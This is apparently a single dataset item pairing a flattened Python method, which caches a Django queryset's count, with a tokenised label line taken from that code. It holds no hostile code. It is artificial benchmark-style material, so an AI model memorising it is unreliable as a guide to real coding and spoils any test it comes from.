{"input": "def count(self): if self._should_cache(\"count\"): # Optmization borrowed from overriden method: # if queryset cache is already filled just return its len if self._result_cache is not None: return len(self._result_cache) return cached_as(self)(lambda: self._no_monkey.count(self))() else: return self._no_monkey.count(self)", "label": "if self . _result_cache is not None :"}
